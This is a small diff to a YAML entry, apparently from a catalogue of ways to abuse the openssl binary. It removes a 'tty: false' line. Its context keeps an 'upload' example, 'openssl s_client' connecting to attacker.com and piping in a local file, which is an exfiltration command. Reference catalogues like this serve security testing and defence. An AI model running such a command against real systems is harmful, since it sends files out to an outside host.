@@ -46,7 +46,6 @@ functions:
       suid:
       unprivileged:
     listener: tls-server
-    tty: false
   upload:
   - code: |-
       openssl s_client -quiet -connect attacker.com:12345 </path/to/input-file
